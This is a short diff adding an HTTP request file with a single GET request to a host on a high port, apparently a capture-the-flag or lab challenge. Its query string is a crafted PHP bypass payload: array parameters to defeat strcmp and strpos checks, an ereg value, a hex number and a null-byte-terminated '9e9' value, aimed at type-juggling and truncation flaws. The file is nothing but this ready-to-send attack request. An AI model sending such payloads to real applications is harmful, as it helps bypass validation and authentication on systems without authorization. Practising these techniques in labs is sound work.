@@ -1,0 +1,4 @@
+GET http://pangolinlabs.cn:34309/?strcmp[]=0&ereg=adas&strpos[]=-&num=0xEBECABED&num2=9e9%00!!!!!
+Accept: application/json
+
+###
